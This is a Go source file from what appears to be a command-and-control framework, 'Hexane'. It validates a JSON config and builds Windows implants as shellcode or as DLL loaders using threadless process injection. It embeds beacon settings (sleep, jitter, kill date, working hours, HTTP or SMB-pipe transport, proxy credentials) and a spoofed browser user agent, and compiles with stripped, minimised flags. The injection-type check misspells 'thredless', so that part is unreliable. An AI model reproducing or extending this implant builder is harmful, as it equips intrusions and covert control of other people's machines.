package core

import (
	"fmt"
	"os"
	"path/filepath"
)

var (
	Debug        = false
	ShowCommands = false
	ShowConfigs  = false

	Cb             = make(chan Callback)
	HexanePayloads = new(Payloads)
	HexaneServers  = new(ServerList)
	HexaneSession  = &Session{
		Username: "lemur",
		Admin:    true,
	}

	FSTAT_RW  = os.O_RDWR | os.O_APPEND
	Useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
)

var ModuleStrings = []string{
	"crypt32",
	"winhttp",
	"advapi32",
	"iphlpapi",
}

func (h *HexaneConfig) GenerateConfigBytes() error {
	var (
		err   error
		patch []byte
	)

	key := CryptCreateKey(16)
	if patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	h.Key = key
	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.

	return nil
}

/*
func (tc *TypedConfig) UnmarshalJSON(data []byte) error {

	var temp struct {
		Type   string          `json:"Type"`
		Config json.RawMessage `json:"Config"`
	}

	if err := json.Unmarshal(data, &temp); err != nil {
		return err
	}

	tc.Type = temp.Type

	switch tc.Type {
	case "http":
		var httpConfig Http
		if err := json.Unmarshal(temp.Config, &httpConfig); err != nil {
			return err
		}
		tc.Config = &httpConfig

	case "smb":
		var smbConfig Smb
		if err := json.Unmarshal(temp.Config, &smbConfig); err != nil {
			return err
		}
		tc.Config = &smbConfig

	case "threadless":
		var injectConfig Threadless
		if err := json.Unmarshal(temp.Config, &injectConfig); err != nil {
			return err
		}
		tc.Config = &injectConfig

	default:
		return fmt.Errorf("unknown config type: %s", tc.Type)
	}

	return nil
}
*/

func (h *HexaneConfig) CreateConfig() {

	WrapMessage("INF", "generating config for "+h.GetBuildType())

	h.Compiler = new(Compiler)
	h.Implant = new(Implant)

	h.Compiler.BuildDirectory = "../payload/" + h.UserConfig.Builder.OutputName

	h.Compiler.Debug = h.UserConfig.Config.Debug
	h.Compiler.Arch = h.UserConfig.Config.Arch
	h.Compiler.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
	h.Compiler.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
	h.Compiler.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
	h.Compiler.Windres = "/usr/bin/x86_64-w64-mingw32-windres"
	h.Compiler.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
	h.Compiler.Assembler = "/usr/bin/nasm"

	h.Implant.LoadedModules = []string{
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
		".reloc",
	}

	if h.UserConfig.Config.Debug {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}
}

func ReadConfig(cfgPath string) error {
	var (
		err error
		h   *HexaneConfig
	)

	h = new(HexaneConfig)
	WrapMessage("INF", fmt.Sprintf("loading %s", cfgPath))

	if err = h.ReadJson(filepath.Join("../json", cfgPath)); err != nil {
		return err
	}

	h.CreateConfig()
	h.PeerId = GeneratePeerId()

	if h.UserConfig.Config != nil {
		if h.UserConfig.Config.Hostname == "" {
			return fmt.Errorf("config:: - a hostname must be provided")
		}
		if h.UserConfig.Config.Arch == "" {
			return fmt.Errorf("config:: - an architecture must be provided")
		}
	} else {
		return fmt.Errorf("config:: - Config { } is required")
	}

	if h.UserConfig.Builder != nil {
		if h.UserConfig.Builder.RootDirectory == "" {
			return fmt.Errorf("config:: - a root directory must be provided")
		}
		if h.UserConfig.Builder.OutputName == "" {
			return fmt.Errorf("config:: - an output name must be provided")
		}
		if h.UserConfig.Builder.Sources == nil || len(h.UserConfig.Builder.Sources) == 0 {
			return fmt.Errorf("implant::builder - builder must specify source files")
		}

		if h.UserConfig.Builder.Loader == nil {
			h.BuildType = BUILD_TYPE_SHELLCODE

		} else {
			h.BuildType = BUILD_TYPE_DLL

			if h.UserConfig.Builder.Loader.RootDirectory == "" {
				return fmt.Errorf("implant::loader - root directory must be specified")
			}
			if h.UserConfig.Builder.Loader.MainFile == "" {
				return fmt.Errorf("implant::loader - main dll file must be specified")
			}
			if h.UserConfig.Builder.Loader.RsrcScript == "" {
				return fmt.Errorf("implant::loader - resource script must be specified")
			}
			if h.UserConfig.Builder.Loader.RsrcBinary == "" {
				return fmt.Errorf("implant::loader - resource output name must be specified")
			}

			switch h.UserConfig.Builder.Loader.Injection.Type {
			case "thredless":
				if h.UserConfig.Builder.Loader.Injection.Config.(*Threadless) == nil {
					return fmt.Errorf("implant::injection - threadless configuration must be specified")
				}
			default:
				return fmt.Errorf("implant::loader - unknown injection method")
			}
		}
	} else {
		return fmt.Errorf("config:: - Builder { } is required")
	}

	if h.UserConfig.Network != nil {
		switch h.UserConfig.Network.Type {

		case "http":
			h.Implant.ProfileTypeId = TRANSPORT_HTTP
			httpConfig, ok := h.UserConfig.Network.Config.(*Http)

			if !ok {
				return fmt.Errorf("network::http - incorrect type assertion")
			}
			if httpConfig.Address == "" {
				return fmt.Errorf("network::http - ip address must be specified")
			}
			if httpConfig.Port > 65535 || httpConfig.Port < 1 {
				return fmt.Errorf("network::http - invalid tcp port %d", httpConfig.Port)
			}
			if httpConfig.Endpoints == nil {
				// todo: add default endpoints from seclists or smth
				return fmt.Errorf("network::http - at least 1 http endpoint must be specified")
			}
			if httpConfig.Useragent == "" {
				httpConfig.Useragent = Useragent
			}
		case "smb":
			h.Implant.ProfileTypeId = TRANSPORT_PIPE
			smbConfig, ok := h.UserConfig.Network.Config.(*Smb)

			if !ok {
				return fmt.Errorf("network::smb - incorrect type assertion")
			}
			if smbConfig.EgressPeer == "" {
				return fmt.Errorf("network::smb - peer must have it's parent node name specified")
			}
		default:
			return fmt.Errorf("network:: - unknown network profile type")
		}
	} else {
		return fmt.Errorf("config:: - Network { } is required")
	}

	h.UserSession = HexaneSession
	return h.RunBuild()
}

func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
	var err error

	stream := CreateStream()
	implant := h.Implant

	stream.PackDword(h.PeerId)
	stream.PackString(implant.Hostname)
	stream.PackDword(implant.Sleeptime)
	stream.PackDword(implant.Jitter)
	stream.PackDword64(implant.Killdate)
	stream.PackInt32(implant.WorkingHours)

	switch implant.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			hNet := h.UserConfig.Network.Config.(*Http)

			stream.PackWString(hNet.Useragent)
			stream.PackWString(hNet.Address)
			stream.PackString(hNet.Domain)
			stream.PackDword(uint32(hNet.Port))

			// endpoints always need specified
			// todo: add random endpoints when not specified. use seclists or smth.

			stream.PackDword(uint32(len(hNet.Endpoints)))
			for _, uri := range hNet.Endpoints {
				stream.PackWString(uri)
			}

			if hNet.Proxy != nil {
				proxyUrl := fmt.Sprintf("%v://%v:%v", hNet.Proxy.Proto, hNet.Proxy.Address, hNet.Proxy.Port)

				stream.PackDword(1)
				stream.PackWString(proxyUrl)
				stream.PackWString(hNet.Proxy.Username)
				stream.PackWString(hNet.Proxy.Password)

			} else {
				stream.PackDword(0)
			}

			break
		}
	case TRANSPORT_PIPE:
		{
			hNet := h.UserConfig.Network.Config.(*Smb)
			stream.PackWString(hNet.EgressPipename)
		}
	}
	return stream.Buffer, err
}
